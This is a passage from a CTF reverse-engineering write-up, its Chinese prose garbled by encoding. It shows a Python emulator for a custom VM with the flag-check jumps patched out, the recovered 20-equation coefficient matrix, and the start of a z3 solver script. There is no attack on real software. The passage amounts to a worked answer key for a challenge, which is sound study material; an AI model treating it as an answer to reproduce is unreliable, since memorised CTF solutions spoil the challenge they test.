class="comment">#reset the out pointer</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">6</span>:</span><br><span class="line">                    out_pointer = <span class="number">0</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;out_pointer = 0&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;out_pointer = 0\n&quot;</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#pop-in</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">7</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;from input[&quot;</span> + <span class="built_in">hex</span>(in_pointer) + <span class="string">&quot;] copy &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot; bytes to mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;from input[&quot;</span> + <span class="built_in">hex</span>(in_pointer) + <span class="string">&quot;] copy &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot; bytes to mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;]\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]):</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] + i] = input_text[in_pointer]</span><br><span class="line">                            in_pointer += <span class="number">1</span></span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#pop-out</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">8</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;from mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;] copy &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot; bytes to output[&quot;</span> + <span class="built_in">hex</span>(out_pointer) + <span class="string">&quot;]&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;from mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;] copy &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot; bytes to output[&quot;</span> + <span class="built_in">hex</span>(out_pointer) + <span class="string">&quot;]\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]):</span><br><span class="line">                        output_text.append(all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] + i])</span><br><span class="line">                        out_pointer += <span class="number">1</span></span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#read_buffer</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">9</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;get_user_input and write in&quot;</span>, unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>])</span><br><span class="line">                    opcode.write(<span class="string">&quot;get_user_input and write in &quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    input_text = [<span class="built_in">ord</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">input</span>()]</span><br><span class="line">                    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(input_text)):</span><br><span class="line">                        all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] + i] = input_text[i]</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#write_buffer</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">10</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;print signal(correct or not)&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;print signal(correct or not)\n&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> output_text]))</span><br><span class="line">                    opcode.write(<span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> output_text]) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#jump</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">11</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    now_mem = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]]</span><br><span class="line">                    <span class="comment"># if (arg and not(now_mem)):</span></span><br><span class="line">                    <span class="comment">#     print(&quot;goto &quot; + hex(unpack(&quot;&lt;I&quot;, now_op)[0]))</span></span><br><span class="line">                    <span class="comment">#     opcode_file.seek(unpack(&quot;&lt;I&quot;, now_op)[0])</span></span><br><span class="line">                    <span class="comment">#     now_op = opcode_file.read(4)</span></span><br><span class="line">                    <span class="comment">#     continue</span></span><br><span class="line">                    <span class="comment"># else:</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;not jump&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;not jump\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] - <span class="number">1</span>):</span><br><span class="line">                        now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#not-jump</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">12</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    now_mem = all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]]</span><br><span class="line">                    <span class="comment"># if (arg and (now_mem)):</span></span><br><span class="line">                    <span class="comment">#     print(&quot;goto &quot; + hex(unpack(&quot;&lt;I&quot;, now_op)[0]))</span></span><br><span class="line">                    <span class="comment">#     opcode_file.seek(unpack(&quot;&lt;I&quot;, now_op)[0])</span></span><br><span class="line">                    <span class="comment">#     now_op = opcode_file.read(4)</span></span><br><span class="line">                    <span class="comment">#     continue</span></span><br><span class="line">                    <span class="comment"># else:</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;not jump&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;not jump\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] - <span class="number">2</span>):</span><br><span class="line">                        now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#get-lenth-of-input</span></span><br><span class="line">                <span class="keyword">if</span> unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>] == <span class="number">13</span>:</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    arg = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot;] = len(mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) +<span class="string">&quot;])&quot;</span>)</span><br><span class="line">                    opcode.write(<span class="string">&quot;mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]) + <span class="string">&quot;] = len(mem[&quot;</span> + <span class="built_in">str</span>(unpack(<span class="string">&quot;&lt;I&quot;</span>, now_op)[<span class="number">0</span>]) +<span class="string">&quot;])\n&quot;</span>)</span><br><span class="line">                    all_memory[unpack(<span class="string">&quot;&lt;I&quot;</span>, arg)[<span class="number">0</span>]] = <span class="built_in">len</span>(input_text)</span><br><span class="line">                    now_op = opcode_file.read(<span class="number">4</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                        </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹æ‰€æœ‰flagé”™è¯¯å¯¼è‡´çš„è·³è½¬è¿›è¡Œå‰ªæ è®©è™šæ‹Ÿæœºä¸€ç›´è·‘åˆ°ç»“æŸä»¥è·å¾—å®Œæ•´çš„è¿è¡Œè¿‡ç¨‹ å‘ç°æ˜¯ç”¨è¾“å…¥çš„20ä¸ªå­—èŠ‚æ„é€ 20å…ƒæ–¹ç¨‹ç»„(æ‰€ä»¥è¿™é‡Œçš„è¾“å‡ºopçš„è„šæœ¬è¿›è¡Œäº†ç®€åŒ– åªè¾“å‡ºæ¯ä¸€é¡¹çš„ç³»æ•°å’Œ0æ¬¡é¡¹) å¾—åˆ°å¢å¹¿çŸ©é˜µ:</p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">key[0][0] == 115, key[0][1] == 26, key[0][2] == 128, key[0][3] == 200, key[0][4] == 21, key[0][5] == 234, key[0][6] == 172, key[0][7] == 152, key[0][8] == 39, key[0][9] == 71, key[0][10] == 55, key[0][11] == 28, key[0][12] == 105, key[0][13] == 42, key[0][14] == 75, key[0][15] == 63, key[0][16] == 114, key[0][17] == 205, key[0][18] == 2, key[0][19] == 222, sum[0] == 217114</span><br><span class="line">not jump</span><br><span class="line">key[1][0] == 212, key[1][1] == 148, key[1][2] == 17, key[1][3] == 74, key[1][4] == 87, key[1][5] == 253, key[1][6] == 250, key[1][7] == 136, key[1][8] == 89, key[1][9] == 211, key[1][10] == 49, key[1][11] == 26, key[1][12] == 115, key[1][13] == 88, key[1][14] == 181, key[1][15] == 195, key[1][16] == 237, key[1][17] == 10, key[1][18] == 119, key[1][19] == 121, sum[1] == 270581</span><br><span class="line">not jump</span><br><span class="line">key[2][0] == 229, key[2][1] == 172, key[2][2] == 230, key[2][3] == 123, key[2][4] == 245, key[2][5] == 127, key[2][6] == 119, key[2][7] == 157, key[2][8] == 208, key[2][9] == 159, key[2][10] == 37, key[2][11] == 32, key[2][12] == 5, key[2][13] == 207, key[2][14] == 145, key[2][15] == 75, key[2][16] == 251, key[2][17] == 60, key[2][18] == 135, key[2][19] == 125, sum[2] == 291585</span><br><span class="line">not jump</span><br><span class="line">key[3][0] == 181, key[3][1] == 83, key[3][2] == 66, key[3][3] == 43, key[3][4] == 85, key[3][5] == 198, key[3][6] == 89, key[3][7] == 205, key[3][8] == 114, key[3][9] == 221, key[3][10] == 105, key[3][11] == 145, key[3][12] == 155, key[3][13] == 91, key[3][14] == 123, key[3][15] == 48, key[3][16] == 76, key[3][17] == 64, key[3][18] == 141, key[3][19] == 22, sum[3] == 234325</span><br><span class="line">not jump</span><br><span class="line">key[4][0] == 211, key[4][1] == 225, key[4][2] == 204, key[4][3] == 55, key[4][4] == 107, key[4][5] == 76, key[4][6] == 7, key[4][7] == 39, key[4][8] == 199, key[4][9] == 84, key[4][10] == 167, key[4][11] == 62, key[4][12] == 219, key[4][13] == 54, key[4][14] == 6, key[4][15] == 144, key[4][16] == 55, key[4][17] == 98, key[4][18] == 186, key[4][19] == 116, sum[4] == 240502</span><br><span class="line">not jump</span><br><span class="line">key[5][0] == 149, key[5][1] == 163, key[5][2] == 127, key[5][3] == 186, key[5][4] == 46, key[5][5] == 118, key[5][6] == 247, key[5][7] == 194, key[5][8] == 9, key[5][9] == 165, key[5][10] == 169, key[5][11] == 224, key[5][12] == 68, key[5][13] == 129, key[5][14] == 54, key[5][15] == 15, key[5][16] == 134, key[5][17] == 39, key[5][18] == 185, key[5][19] == 248, sum[5] == 277604</span><br><span class="line">not jump</span><br><span class="line">key[6][0] == 245, key[6][1] == 159, key[6][2] == 64, key[6][3] == 241, key[6][4] == 163, key[6][5] == 116, key[6][6] == 4, key[6][7] == 15, key[6][8] == 126, key[6][9] == 170, key[6][10] == 10, key[6][11] == 110, key[6][12] == 251, key[6][13] == 169, key[6][14] == 252, key[6][15] == 99, key[6][16] == 199, key[6][17] == 188, key[6][18] == 149, key[6][19] == 72, sum[6] == 286168</span><br><span class="line">not jump</span><br><span class="line">key[7][0] == 233, key[7][1] == 38, key[7][2] == 197, key[7][3] == 105, key[7][4] == 202, key[7][5] == 2, key[7][6] == 22, key[7][7] == 225, key[7][8] == 189, key[7][9] == 166, key[7][10] == 239, key[7][11] == 220, key[7][12] == 70, key[7][13] == 98, key[7][14] == 194, key[7][15] == 129, key[7][16] == 27, key[7][17] == 236, key[7][18] == 159, key[7][19] == 62, sum[7] == 290450</span><br><span class="line">not jump</span><br><span class="line">key[8][0] == 152, key[8][1] == 67, key[8][2] == 72, key[8][3] == 35, key[8][4] == 12, key[8][5] == 55, key[8][6] == 139, key[8][7] == 4, key[8][8] == 169, key[8][9] == 142, key[8][10] == 135, key[8][11] == 122, key[8][12] == 3, key[8][13] == 166, key[8][14] == 139, key[8][15] == 62, key[8][16] == 23, key[8][17] == 92, key[8][18] == 11, key[8][19] == 136, sum[8] == 179355</span><br><span class="line">not jump</span><br><span class="line">key[9][0] == 96, key[9][1] == 141, key[9][2] == 38, key[9][3] == 124, key[9][4] == 139, key[9][5] == 43, key[9][6] == 15, key[9][7] == 119, key[9][8] == 30, key[9][9] == 252, key[9][10] == 255, key[9][11] == 123, key[9][12] == 223, key[9][13] == 200, key[9][14] == 21, key[9][15] == 117, key[9][16] == 231, key[9][17] == 9, key[9][18] == 239, key[9][19] == 222, sum[9] == 272487</span><br><span class="line">not jump</span><br><span class="line">key[10][0] == 249, key[10][1] == 91, key[10][2] == 66, key[10][3] == 21, key[10][4] == 121, key[10][5] == 146, key[10][6] == 5, key[10][7] == 180, key[10][8] == 6, key[10][9] == 80, key[10][10] == 112, key[10][11] == 255, key[10][12] == 239, key[10][13] == 17, key[10][14] == 39, key[10][15] == 254, key[10][16] == 153, key[10][17] == 118, key[10][18] == 47, key[10][19] == 217, sum[10] == 249816</span><br><span class="line">not jump</span><br><span class="line">key[11][0] == 84, key[11][1] == 96, key[11][2] == 190, key[11][3] == 188, key[11][4] == 255, key[11][5] == 181, key[11][6] == 188, key[11][7] == 124, key[11][8] == 47, key[11][9] == 70, key[11][10] == 201, key[11][11] == 160, key[11][12] == 126, key[11][13] == 210, key[11][14] == 236, key[11][15] == 22, key[11][16] == 120, key[11][17] == 181, key[11][18] == 197, key[11][19] == 69, sum[11] == 305636</span><br><span class="line">not jump</span><br><span class="line">key[12][0] == 51, key[12][1] == 173, key[12][2] == 216, key[12][3] == 143, key[12][4] == 41, key[12][5] == 174, key[12][6] == 184, key[12][7] == 189, key[12][8] == 111, key[12][9] == 133, key[12][10] == 79, key[12][11] == 36, key[12][12] == 99, key[12][13] == 140, key[12][14] == 120, key[12][15] == 144, key[12][16] == 80, key[12][17] == 231, key[12][18] == 187, key[12][19] == 107, sum[12] == 276217</span><br><span class="line">not jump</span><br><span class="line">key[13][0] == 173, key[13][1] == 39, key[13][2] == 151, key[13][3] == 161, key[13][4] == 139, key[13][5] == 233, key[13][6] == 143, key[13][7] == 205, key[13][8] == 170, key[13][9] == 125, key[13][10] == 209, key[13][11] == 54, key[13][12] == 128, key[13][13] == 134, key[13][14] == 55, key[13][15] == 246, key[13][16] == 157, key[13][17] == 57, key[13][18] == 42, key[13][19] == 195, sum[13] == 294166</span><br><span class="line">not jump</span><br><span class="line">key[14][0] == 5, key[14][1] == 49, key[14][2] == 235, key[14][3] == 8, key[14][4] == 84, key[14][5] == 9, key[14][6] == 219, key[14][7] == 90, key[14][8] == 109, key[14][9] == 164, key[14][10] == 38, key[14][11] == 159, key[14][12] == 218, key[14][13] == 214, key[14][14] == 22, key[14][15] == 205, key[14][16] == 7, key[14][17] == 57, key[14][18] == 210, key[14][19] == 131, sum[14] == 237236</span><br><span class="line">not jump</span><br><span class="line">key[15][0] == 107, key[15][1] == 67, key[15][2] == 107, key[15][3] == 141, key[15][4] == 129, key[15][5] == 250, key[15][6] == 97, key[15][7] == 3, key[15][8] == 26, key[15][9] == 215, key[15][10] == 119, key[15][11] == 213, key[15][12] == 255, key[15][13] == 183, key[15][14] == 229, key[15][15] == 1, key[15][16] == 27, key[15][17] == 9, key[15][18] == 88, key[15][19] == 59, sum[15] == 242008</span><br><span class="line">not jump</span><br><span class="line">key[16][0] == 57, key[16][1] == 72, key[16][2] == 91, key[16][3] == 96, key[16][4] == 125, key[16][5] == 105, key[16][6] == 94, key[16][7] == 235, key[16][8] == 138, key[16][9] == 39, key[16][10] == 145, key[16][11] == 130, key[16][12] == 126, key[16][13] == 147, key[16][14] == 254, key[16][15] == 179, key[16][16] == 181, key[16][17] == 183, key[16][18] == 216, key[16][19] == 211, sum[16] == 289929</span><br><span class="line">not jump</span><br><span class="line">key[17][0] == 164, key[17][1] == 205, key[17][2] == 28, key[17][3] == 160, key[17][4] == 233, key[17][5] == 70, key[17][6] == 109, key[17][7] == 51, key[17][8] == 0, key[17][9] == 71, key[17][10] == 99, key[17][11] == 163, key[17][12] == 37, key[17][13] == 98, key[17][14] == 46, key[17][15] == 44, key[17][16] == 138, key[17][17] == 135, key[17][18] == 191, key[17][19] == 144, sum[17] == 221788</span><br><span class="line">not jump</span><br><span class="line">key[18][0] == 13, key[18][1] == 240, key[18][2] == 143, key[18][3] == 53, key[18][4] == 75, key[18][5] == 23, key[18][6] == 26, key[18][7] == 224, key[18][8] == 31, key[18][9] == 199, key[18][10] == 182, key[18][11] == 220, key[18][12] == 130, key[18][13] == 61, key[18][14] == 170, key[18][15] == 130, key[18][16] == 253, key[18][17] == 240, key[18][18] == 182, key[18][19] == 9, sum[18] == 268459</span><br><span class="line">not jump</span><br><span class="line">key[19][0] == 245, key[19][1] == 96, key[19][2] == 170, key[19][3] == 79, key[19][4] == 249, key[19][5] == 16, key[19][6] == 121, key[19][7] == 6, key[19][8] == 7, key[19][9] == 69, key[19][10] == 212, key[19][11] == 133, key[19][12] == 52, key[19][13] == 20, key[19][14] == 225, key[19][15] == 102, key[19][16] == 228, key[19][17] == 121, key[19][18] == 56, key[19][19] == 208, sum[19] == 247407</span><br></pre></td></tr></table></figure>

<p>ç”¨z3è§£è¯¥æ–¹ç¨‹ç»„(å»ºè®®ä½¿ç”¨z3++ pythonæ•ˆç‡å¤ªä½<del>ä½†æ˜¯è°è®©æˆ‘ä¸ä¼šå‘¢</del>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [Int(<span class="string">&quot;flag_%s&quot;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">key = [[Int(<span class="string">&quot;key_%d_%d&quot;</span> % (i, j)) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line"><span class="built_in">sum</span> = [Int(<span class="string">&#x27;sum_%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    s.add(<span class="built_in">sum</span>[i] == <span class="number">0</span>)</span><br><span class="line">s.add(key[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">115</span>, key[<span class="number">0</span>][<span class="number">1</span>] == <span class="number">26</span>, key[<span class="number">0</span>][<span class="number">2</span>] == <span class="number">128</span>, key[<span class="number">0</span>][<span class="number">3</span>] == <span class="number">200</span>, key[<span class="number">0</span>][<span class="number">4</span>] == <span class="number">21</span>, key[<span class="number">0</span>][<span class="number">5</span>] == <span class="number">234</span>, key[<span class="number">0</span>][<span class="number">6</span>] == <span class="number">172</span>, key[<span class="number">0</span>][<span class="number">7</span>] == <span class="number">152</span>, key[<span class="number">0</span>][<span class="number">8</span>] == <span class="number">39</span>, key[<span class="number">0</span>][<span class="number">9</span>] == <span class="number">71</span>, key[<span class="number">0</span>][<span class="number">10</span>] == <span class="number">55</span>, key[<span class="number">0</span>][<span class="number">11</span>] == <span class="number">28</span>, key[<span class="number">0</span>][<span class="number">12</span>] == <span class="number">105</span>, key[<span class="number">0</span>][<span class="number">13</span>] == <span class="number">42</span>, key[<span class="number">0</span>][<span class="number">14</span>] == <span class="number">75</span>, key[<span class="number">0</span>][<span class="number">15</span>] == <span class="number">63</span>, key[<span class="number">0</span>][<span class="number">16</span>] == <span class="number">114</span>, key[<span class="number">0</span>][<span class="number">17</span>] == <span class="number">205</span>, key[<span class="number">0</span>][<span class="number">18</span>] == <span class="number">2</span>, key[<span class="number">0</span>][<span class="number">19</span>] == <span class="number">222</span>, </span><br><span class="line">key[<span class="number">1</span>][<span class="number">0</span>] == <span class="number">212</span>, key[<span class="number">1</span>][<span class="number">1</span>] == <span class="number">148</span>, key[<span class="number">1</span>][<span class="number">2</span>] == <span class="number">17</span>, key[<span class="number">1</span>][<span class="number">3</span>] == <span class="number">74</span>, key[<span class="number">1</span>][<span class="number">4</span>] == <span class="number">87</span>, key[<span class="number">1</span>][<span class="number">5</span>] == <span class="number">253</span>, key[<span class="number">1</span>][<span class="number">6</span>] == <span class="number">250</span>, key[<span class="number">1</span>][<span class="number">7</span>] == <span class="number">136</span>, key[<span class="number">1</span>][<span class="number">8</span>] == <span class="number">89</span>, key[<span class="number">1</span>][<span class="number">9</span>] == <span class="number">211</span>, key[<span class="number">1</span>][<span class="number">10</span>] == <span class="number">49</span>, key[<span class="number">1</span>][<span class="number">11</span>] == <span class="number">26</span>, key[<span class="number">1</span>][<span class="number">12</span>] == <span class="number">115</span>, key[<span class="number">1</span>][<span class="number">13</span>] == <span class="number">88</span>, key[<span class="number">1</span>][<span class="number">14</span>] == <span class="number">181</span>, key[<span class="number">1</span>][<span class="number">15</span>] == <span class="number">195</span>, key[<span class="number">1</span>][<span class="number">16</span>] == <span class="number">237</span>, key[<span class="number">1</span>][<span class="number">17</span>] == <span class="number">10</span>, key[<span class="number">1</span>][<span class="number">18</span>] == <span class="number">119</span>, key[<span class="number">1</span>][<span class="number">19</span>] == <span class="number">121</span>, </span><br><span class="line">key[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">229</span>, key[<span class="number">2</span>][<span class="number">1</span>] == <span class="number">172</span>, key[<span class="number">2</span>][<span class="number">2</span>] == <span class="number">230</span>, key[<span class="number">2</span>][<span class="number">3</span>] == <span class="number">123</span>, key[<span class="number">2</span>][<span class="number">4</span>] == <span class="number">245</span>, key[<span class="number">2</span>][<span class="number">5</span>] == <span class="number">127</span>, key[<span class="number">2</span>][<span class="number">6</span>] == <span class="number">119</span>, key[<span class="number">2</span>][<span class="number">7</span>] == <span class="number">157</span>, key[<span class="number">2</span>][<span class="number">8</span>] == <span class="number">208</span>, key[<span class="number">2</span>][<span class="number">9</span>] == <span class="number">159</span>, key[<span class="number">2</span>][<span class="number">10</span>] == <span class="number">37</span>, key[<span class="number">2</span>][<span class="number">11</span>] == <span class="number">32</span>, key[<span class="number">2</span>][<span class="number">12</span>] == <span class="number">5</span>, key[<span class="number">2</span>][<span class="number">13</span>] == <span class="number">207</span>, key[<span class="number">2</span>][<span class="number">14</span>] == <span class="number">145</span>, key[<span class="number">2</span>][<span class="number">15</span>] == <span class="number">75</span>, key[<span class="number">2</span>][<span class="number">16</span>] == <span class="number">251</span>, key[<span class="number">2</span>][<span class="number">17</span>] == <span class="number">60</span>, key[<span class="number">2</span>][<span class="number">18</span>] == <span class="number">135</span>, key[<span class="number">2</span>][<span class="number">19</span>] == <span class="number">125</span>, </span><br><span class="line">key[<span class="number">3</span>][<span class="number">0</span>] == <span class="number">181</span>, key[<span class="number">3</span>][<span class="number">1</span>] == <span class="number">83</span>, key[<span class="number">3</span>][<span class="number">2</span>] == <span class="number">66</span>, key[<span class="number">3</span>][<span class="number">3</span>] == <span class="number">43</span>, key[<span class="number">3</span>][<span class="number">4</span>] == <span class="number">85</span>, key[<span class="number">3</span>][<span class="number">5</span>] == <span class="number">198</span>, key[<span class="number">3</span>][<span class="number">6</span>] == <span class="number">89</span>, key[<span class="number">3</span>][<span class="number">7</span>] == <span class="number">205</span>, key[<span class="number">3</span>][<span class="number">8</span>] == <span class="number">114</span>, key[<span class="number">3</span>][<span class="number">9</span>] == <span class="number">221</span>, key[<span class="number">3</span>][<span class="number">10</span>] == <span class="number">105</span>, key[<span class="number">3</span>][<span class="number">11</span>] == <span class="number">145</span>, key[<span class="number">3</span>][<span class="number">12</span>] == <span class="number">155</span>, key[<span class="number">3</span>][<span class="number">13</span>] == <span class="number">91</span>, key[<span class="number">3</span>][<span class="number">14</span>] == <span class="number">123</span>, key[<span class="number">3</span>][<span class="number">15</span>] == <span class="number">48</span>, key[<span class="number">3</span>][<span class="number">16</span>] == <span class="number">76</span>, key[<span class="number">3</span>][<span class="number">17</span>] == <span class="number">64</span>, key[<span class="number">3</span>][<span class="number">18</span>] == <span class="number">141</span>, key[<span class="number">3</span>][<span class="number">19</span>] == <span class="number">22</span>, </span><br><span class="line">key[<span class="number">4</span>][<span class="number">0</span>] == <span class="number">211</span>, key[<span class="number">4</span>][<span class="number">1</span>] == <span class="number">225</span>, key[<span class="number">4</span>][<span class="number">2</span>] == <span class="number">204</span>, key[<span class="number">4</span>][<span class="number">3</span>] == <span class="number">55</span>, key[<span class="number">4</span>][<span class="number">4</span>] == <span class="number">107</span>, key[<span class="number">4</span>][<span class="number">5</span>] == <span class="number">76</span>, key[<span class="number">4</span>][<span class="number">6</span>] == <span class="number">7</span>, key[<span class="number">4</span>][<span class="number">7</span>] == <span class="number">39</span>, key[<span class="number">4</span>][<span class="number">8</span>] == <span class="number">199</span>, key[<span class="number">4</span>][<span class="number">9</span>] == <span class="number">84</span>, key[<span class="number">4</span>][<span class="number">10</span>] == <span class="number">167</span>, key[<span class="number">4</span>][<span class="number">11</span>] == <span class="number">62</span>, key[<span class="number">4</span>][<span class="number">12</span>] == <span class="number">219</span>, key[<span class="number">4</span>][<span class="number">13</span>] == <span class="number">54</span>, key[<span class="number">4</span>][<span class="number">14</span>] == <span class="number">6</span>, key[<span class="number">4</span>][<span class="number">15</span>] == <span class="number">144</span>, key[<span class="number">4</span>][<span class="number">16</span>] == <span class="number">55</span>, key[<span class="number">4</span>][<span class="number">17</span>] == <span class="number">98</span>, key[<span class="number">4</span>][<span class="number">18</span>] == <span class="number">186</span>, key[<span class="number">4</span>][<span class="number">19</span>] == 